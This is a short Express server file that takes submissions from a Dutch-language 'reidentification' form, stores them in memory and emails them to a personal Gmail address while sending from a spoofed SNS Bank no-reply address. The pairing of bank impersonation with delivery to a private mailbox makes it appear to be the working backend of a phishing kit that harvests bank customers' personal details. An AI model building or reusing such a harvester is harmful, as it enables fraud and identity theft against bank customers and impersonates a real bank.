import express from 'express';
import { formDataSchema } from '../shared/schema.js';
import { sendEmail, generateReidentificationEmail } from '../server/services/resend.js';
import { z } from 'zod';

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

// In-memory storage for Vercel (you'll want to use a database for production)
const storage = {
  submissions: [],
  createReidentificationSubmission: async (data) => {
    const submission = {
      id: Math.random().toString(36).substr(2, 9),
      submissionData: data.submissionData,
      submittedAt: new Date(),
      emailSent: "false"
    };
    storage.submissions.push(submission);
    return submission;
  },
  updateReidentificationEmailStatus: async (id, status) => {
    const submission = storage.submissions.find(s => s.id === id);
    if (submission) {
      submission.emailSent = status;
    }
  }
};

// Submit reidentification form
app.post('/api/reidentification/submit', async (req, res) => {
  try {
    // Validate the form data
    const validatedData = formDataSchema.parse(req.body);
    
    // Store the submission
    const submission = await storage.createReidentificationSubmission({
      submissionData: validatedData
    });
    
    // Generate email content
    const emailContent = generateReidentificationEmail(validatedData);
    
    // Send email using Resend
    const emailParams = {
      to: process.env.ADMIN_EMAIL || "punkin199573@gmail.com",
      from: process.env.FROM_EMAIL || "noreply@snsbank.nl",
      subject: emailContent.subject,
      html: emailContent.html,
      text: emailContent.text
    };
    
    const emailSent = await sendEmail(emailParams);
    
    // Update email status
    await storage.updateReidentificationEmailStatus(
      submission.id, 
      emailSent ? "true" : "false"
    );
    
    res.json({ 
      success: true, 
      submissionId: submission.id,
      emailSent: emailSent
    });
    
  } catch (error) {
    console.error("Reidentification submission error:", error);
    
    if (error instanceof z.ZodError) {
      res.status(400).json({ 
        message: "Validatiefout in formuliergegevens",
        errors: error.errors 
      });
    } else {
      res.status(500).json({ 
        message: "Er is een fout opgetreden bij het verzenden van je gegevens" 
      });
    }
  }
});

export default app;